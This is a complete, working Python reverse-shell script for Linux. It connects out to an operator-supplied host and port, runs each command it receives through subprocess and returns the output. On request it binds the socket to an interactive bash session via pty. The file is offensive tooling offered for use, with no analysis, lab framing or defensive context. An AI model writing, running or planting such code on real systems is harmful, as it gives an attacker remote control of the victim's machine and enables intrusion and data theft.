import socket, subprocess, threading, os, sys, pty, argparse

parser = argparse.ArgumentParser(description='Simple Linux reverse shell')
parser.add_argument("--host", type=str, dest="ip", default='127.0.0.1', required=True, help='remote control ip')
parser.add_argument("--port", type=int, dest="port", default='1337', required=True, help='remote control port')
args = parser.parse_args()

HOST = args.ip
PORT = args.port

"""
You also may use it without command args
HOST = "127.0.0.1"
PORT = 1337
"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

def stable():
    sock.send(b"\nStable the connection" + b"\n")
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    os.environ['TERM'] = 'xterm'
    pty.spawn("/bin/bash")

def handle():
    while True:
        sock.send(b"exec> ")
        command = sock.recv(4096).decode().strip()
        #print(command, type(command))
        if command == 'stop':
            sock.send(b"\nBreak the session..." + b"\n")
            break
        elif command == 'stable':
            original_stdin = sys.stdin.fileno()
            original_stdout = sys.stdout.fileno()
            original_stderr = sys.stderr.fileno()
            stable()
        else:
            sock.send(subprocess.getoutput(command).encode() + b"\n")

command_thread = threading.Thread(target=handle)
command_thread.start()